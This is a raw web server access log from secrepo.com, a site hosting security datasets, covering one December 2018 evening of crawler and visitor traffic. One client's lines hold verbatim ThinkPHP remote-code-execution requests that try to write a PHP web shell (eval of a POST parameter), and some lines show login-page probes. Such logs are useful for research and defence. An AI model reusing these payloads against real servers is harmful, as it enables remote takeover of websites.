54.36.148.56 - - [11/Dec/2018:02:29:19 -0800] "GET /self.logs/error.log.2016-03-21.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
78.1.93.85 - - [11/Dec/2018:20:55:31 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
78.1.93.85 - - [11/Dec/2018:20:55:31 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.191 - - [11/Dec/2018:21:06:51 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 301 497 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.108 - - [11/Dec/2018:21:11:37 -0800] "GET /self.logs/error.log.2018-07-27.gz HTTP/1.1" 200 7852 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
13.58.1.116 - - [11/Dec/2018:21:15:38 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" 
39.104.67.86 - - [11/Dec/2018:21:16:54 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:21:16:55 -0800] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:21:16:56 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:21:16:56 -0800] "GET / HTTP/1.1" 200 46423 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
49.204.213.77 - - [11/Dec/2018:21:18:55 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
49.204.213.77 - - [11/Dec/2018:21:18:55 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
49.204.213.77 - - [11/Dec/2018:21:18:55 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
49.204.213.77 - - [11/Dec/2018:21:18:57 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
54.36.148.108 - - [11/Dec/2018:21:20:49 -0800] "GET /self.logs/access.log.2016-12-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
36.110.147.91 - - [11/Dec/2018:21:22:32 -0800] "GET / HTTP/1.1" 301 483 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
36.110.147.91 - - [11/Dec/2018:21:22:33 -0800] "GET / HTTP/1.1" 200 12470 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
36.110.147.91 - - [11/Dec/2018:21:22:33 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
36.110.147.91 - - [11/Dec/2018:21:22:33 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
46.229.168.133 - - [11/Dec/2018:21:25:52 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" 
46.229.168.141 - - [11/Dec/2018:21:25:52 -0800] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" 
115.236.9.84 - - [11/Dec/2018:21:26:07 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
115.236.9.84 - - [11/Dec/2018:21:26:08 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
115.236.9.84 - - [11/Dec/2018:21:26:08 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
115.236.9.84 - - [11/Dec/2018:21:26:13 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
54.36.149.77 - - [11/Dec/2018:21:29:23 -0800] "GET /self.logs/access.log.2017-04-10.gz HTTP/1.1" 200 49939 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.178 - - [11/Dec/2018:21:31:00 -0800] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 15480 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.202.172.225 - - [11/Dec/2018:21:32:32 -0800] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31" 
54.202.172.225 - - [11/Dec/2018:21:32:34 -0800] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31" 
46.119.115.103 - - [11/Dec/2018:21:33:07 -0800] "GET / HTTP/1.1" 200 46368 "https://supermama.top/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" 
46.119.115.103 - - [11/Dec/2018:21:33:07 -0800] "GET / HTTP/1.1" 200 46368 "https://supermama.top/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" 
46.119.115.103 - - [11/Dec/2018:21:33:08 -0800] "GET / HTTP/1.1" 200 46368 "https://supermama.top/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" 
3.16.44.154 - - [11/Dec/2018:21:35:04 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
3.16.180.129 - - [11/Dec/2018:21:35:08 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
100.43.90.103 - - [11/Dec/2018:21:40:45 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [11/Dec/2018:21:40:45 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [11/Dec/2018:21:40:49 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
5.255.250.94 - - [11/Dec/2018:21:40:49 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
54.36.148.61 - - [11/Dec/2018:21:40:55 -0800] "GET /self.logs/access.log.2018-02-03.gz HTTP/1.1" 200 21843 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.197 - - [11/Dec/2018:21:42:26 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 301 515 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.11 - - [11/Dec/2018:21:42:33 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.197 - - [11/Dec/2018:21:42:38 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.224.75.207 - - [11/Dec/2018:20:27:54 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 44362390 "-" "" 
54.36.148.169 - - [11/Dec/2018:21:43:25 -0800] "GET /self.logs/error.log.2015-01-18.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.150.191 - - [11/Dec/2018:21:44:17 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
108.59.8.70 - - [11/Dec/2018:21:44:53 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Dec/2018:21:44:54 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Dec/2018:21:45:00 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Dec/2018:21:45:02 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Dec/2018:21:45:04 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
18.224.59.51 - - [11/Dec/2018:21:45:30 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Safari/602.1" 
23.101.169.3 - - [11/Dec/2018:21:46:56 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)" 
54.36.149.76 - - [11/Dec/2018:21:51:45 -0800] "GET /self.logs/error.log.2017-06-14.gz HTTP/1.1" 200 926 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
112.224.75.207 - - [11/Dec/2018:21:52:55 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36" 
112.5.243.195 - - [11/Dec/2018:21:53:15 -0800] "GET / HTTP/1.1" 200 12470 "https://www.seobook.top/how-to-get-more-traffic-to-website-or-blog-by-doing-seo/26164610/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
54.36.148.95 - - [11/Dec/2018:21:58:39 -0800] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
120.131.11.207 - - [11/Dec/2018:22:00:52 -0800] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C%3Fphp%20eval($_POST[qazw]);%3F%5E%3E%20%3E%20result.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.131.11.207 - - [11/Dec/2018:22:00:54 -0800] "POST /public/result.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.131.11.207 - - [11/Dec/2018:22:00:54 -0800] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27%3C%3Fphp%20eval($_POST[qazw]);%3F%3E%27%20%3E%20result.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.131.11.207 - - [11/Dec/2018:22:00:55 -0800] "POST /public/result.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
54.36.148.228 - - [11/Dec/2018:22:01:00 -0800] "GET /self.logs/error.log.2017-10-10.gz HTTP/1.1" 200 1522 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [11/Dec/2018:22:02:26 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.87 - - [11/Dec/2018:22:03:25 -0800] "GET /self.logs/access.log.2018-04-13.gz HTTP/1.1" 200 26226 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.196 - - [11/Dec/2018:22:04:22 -0800] "GET /self.logs/access.log.2018-10-08.gz HTTP/1.1" 200 21662 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
122.174.240.133 - - [11/Dec/2018:22:08:16 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
122.174.240.133 - - [11/Dec/2018:22:08:16 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.149.64 - - [11/Dec/2018:22:09:21 -0800] "GET /self.logs/access.log.2015-02-05.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
39.104.67.86 - - [11/Dec/2018:22:10:56 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:22:10:57 -0800] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:22:10:58 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.67.86 - - [11/Dec/2018:22:10:59 -0800] "GET / HTTP/1.1" 200 46423 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
112.224.75.207 - - [11/Dec/2018:20:28:03 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 60606167 "-" "" 
157.55.39.195 - - [11/Dec/2018:22:12:04 -0800] "GET /self.logs/access.log.2017-01-16.gz HTTP/1.1" 200 42858 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.138 - - [11/Dec/2018:22:12:51 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
112.224.75.207 - - [11/Dec/2018:20:27:51 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 61771533 "-" "" 
3.17.77.122 - - [11/Dec/2018:22:15:01 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/42.0" 
207.241.229.237 - - [11/Dec/2018:22:15:10 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)" 
41.223.160.138 - - [11/Dec/2018:22:15:10 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.241.229.237 - - [11/Dec/2018:22:15:15 -0800] "GET / HTTP/1.0" 200 46413 "http://secrepo.com/" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)" 
54.36.148.220 - - [11/Dec/2018:22:17:43 -0800] "GET /self.logs/error.log.2017-10-09.gz HTTP/1.1" 200 2758 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.197 - - [11/Dec/2018:22:20:28 -0800] "GET /self.logs/access.log.2017-10-03.gz HTTP/1.1" 200 31426 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.126 - - [11/Dec/2018:22:20:28 -0800] "GET /self.logs/access.log.2015-09-29.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
112.224.75.207 - - [11/Dec/2018:20:40:47 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 59455994 "-" "" 
112.224.75.207 - - [11/Dec/2018:20:27:51 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 70396239 "-" "" 
54.36.148.220 - - [11/Dec/2018:22:24:34 -0800] "GET /self.logs/access.log.2015-10-27.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
14.142.182.194 - - [11/Dec/2018:22:26:43 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
14.142.182.194 - - [11/Dec/2018:22:26:44 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
14.142.182.194 - - [11/Dec/2018:22:26:44 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
14.142.182.194 - - [11/Dec/2018:22:26:44 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
42.236.12.130 - - [11/Dec/2018:22:28:17 -0800] "GET /robots.txt HTTP/1.1" 301 502 "http://secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.130 - - [11/Dec/2018:22:28:17 -0800] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.130 - - [11/Dec/2018:22:28:17 -0800] "GET /robots.txt HTTP/1.1" 200 333 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.178 - - [11/Dec/2018:22:28:17 -0800] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.130 - - [11/Dec/2018:22:28:18 -0800] "GET /robots.txt HTTP/1.1" 301 502 "http://secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.12.130 - - [11/Dec/2018:22:28:19 -0800] "GET /robots.txt HTTP/1.1" 200 334 "http://www.secrepo.com/robots.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
157.55.39.197 - - [11/Dec/2018:22:31:43 -0800] "GET /self.logs/error.log.2018-07-12.gz HTTP/1.1" 200 5164 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.67 - - [11/Dec/2018:22:32:24 -0800] "GET /self.logs/error.log.2017-10-06.gz HTTP/1.1" 200 3008 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.35 - - [11/Dec/2018:22:33:20 -0800] "GET /self.logs/2016/error.log.2016-01-20.gz HTTP/1.1" 200 915 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
13.59.86.83 - - [11/Dec/2018:22:35:08 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
18.220.180.112 - - [11/Dec/2018:22:35:11 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
112.224.75.207 - - [11/Dec/2018:21:42:43 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 31414544 "-" "" 
54.36.148.166 - - [11/Dec/2018:22:41:46 -0800] "GET /self.logs/2016/error.log.2016-02-19.gz HTTP/1.1" 200 552 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.27 - - [11/Dec/2018:22:44:31 -0800] "GET /self.logs/access.log.2016-09-08.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
18.219.24.122 - - [11/Dec/2018:22:45:03 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
54.36.148.120 - - [11/Dec/2018:22:46:54 -0800] "GET /self.logs/access.log.2015-05-05.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.149.6 - - [11/Dec/2018:22:48:03 -0800] "GET /self.logs/error.log.2017-10-05.gz HTTP/1.1" 200 2205 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
52.70.214.85 - - [11/Dec/2018:22:52:17 -0800] "HEAD / HTTP/1.1" 200 282 "-" "Blackboard Safeassign" 
52.70.214.85 - - [11/Dec/2018:22:52:18 -0800] "GET / HTTP/1.1" 200 12433 "-" "Blackboard Safeassign" 
100.43.90.103 - - [11/Dec/2018:22:54:09 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
112.224.75.207 - - [11/Dec/2018:22:23:23 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 20116893 "-" "" 
112.224.75.207 - - [11/Dec/2018:22:14:34 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 26383536 "-" "" 
54.36.148.153 - - [11/Dec/2018:23:00:12 -0800] "GET /self.logs/error.log.2018-08-06.gz HTTP/1.1" 200 6656 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
222.186.20.19 - - [11/Dec/2018:23:00:45 -0800] "GET //dede/login.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
112.224.75.207 - - [11/Dec/2018:23:03:24 -0800] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36" 
113.171.224.176 - - [11/Dec/2018:23:06:39 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
175.157.46.240 - - [11/Dec/2018:23:10:57 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
175.157.46.240 - - [11/Dec/2018:23:10:57 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
13.58.1.116 - - [11/Dec/2018:23:14:54 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Safari/602.1" 
